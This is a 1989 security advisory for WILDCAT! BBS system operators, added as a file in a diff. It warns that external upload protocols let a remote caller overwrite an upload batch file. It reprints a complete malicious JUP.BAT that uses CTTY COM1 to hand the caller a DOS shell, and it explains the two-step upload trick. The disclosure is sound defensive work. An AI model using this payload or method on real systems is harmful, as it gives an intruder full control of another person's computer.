@@ -1,0 +1,133 @@
+
+                            WILDCAT!(tm) BBS system
+                               Security Emergency
+                                 Documentation
+                                January 2, 1989
+                               Richard B. Johnson
+                                PROGRAM EXCHANGE
+                                 (303) 440-0786
+
+          There exists within the WILDCAT!(tm) external protocol pro-
+          cedures the considerable possibility that somebody who is
+          familiar with the system could execute a copy of COMMAND.COM
+          and have full control of your computer, erasing or format-
+          ting disks, and creating all kinds of havoc. Basically, any-
+          thing that you could do from the keyboard can be done by the
+          remote-user if he knows how to do it.
+
+          Please read all the ".DOC" files in this archive and the
+          archives included within. I also suggest that you implement
+          LOG (LOG.ARC) if you haven't already done so. I was able to
+          detect an attempt at breaching security on my own system.
+          The only thing that prevented the hacker from getting to the
+          DOS level was he didn't know what the "upload" filename was
+          on my system. The LOG utility was what first called my
+          attention to this problem.
+
+          Note that I was able to log onto a system in Colorado as a
+          new user and, within 60 seconds I was at the 'DOS' level. It
+          had taken me only 20 seconds on my own system but I knew the
+          names of the "upload" batch files and the communications
+          adapter port being used.
+
+          The problem is that the external protocol setup, as advised
+          by Mustang Software, will allow an "upload" batch file to be
+          replaced by a batch file of the same name during an upload!
+          If your communications adapter port is COM1, and you use a
+          batch file called JUP.BAT for JMODEM uploads, the hacker
+          could upload the following JUP.BAT file:
+
+          REM * hacker's special
+          REM
+          REM
+          REM
+          REM
+          REM
+          REM
+          REM
+          IF %3 == HACKER.TXT GOTO BREAK
+          GOTO END
+          :BREAK
+          @ECHO OFF
+          CTTY COM1
+          COMMAND
+          :END
+
+
+
+
+
+
+
+
+
+
+                                     - 1 -
+          
+
+
+
+
+          It works this way. The first "upload" is a file called
+          JUP.BAT. JMODEM (could be ZMODEM or any external protocol)
+          dutifully overwrites the existing JUP.BAT and exits with no
+          errors.
+
+          COMMAND.COM, when executing a ".BAT" file opens then closes
+          the file for each line in the file. COMMAND.COM "knows" that
+          the last line was, perhaps, line 4. It therefore looks at
+          line 5 for its next instruction. It executes one of the
+          several "REM" statements, then exits at the ":END" label
+          since the filename (%3) was not HACKER.TXT.
+
+          The BBS system software regains control and, finding no file
+          transferred, simply continues like nothing happened.
+
+          The hacker then attempts to upload HACKER.TXT using the
+          JMODEM protocol. JUP.BAT has been replaced with the hacker's
+          new version. Since the %3 parameter is now HACKER.TXT, the
+          batch file branches to label ":BREAK". The console input is
+          redirected to the COM1 port and an additional copy of
+          COMMAND.COM is loaded with its I/O having been redirected to
+          the COM1 port.
+
+          Of course the hacker has not executed any external protocols
+          on his system. He's just sitting there in terminal-mode in
+          full control of your system.
+
+          Caveat modulus carborundum.
+
+          - finis -
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                     - 2 -
+          
+
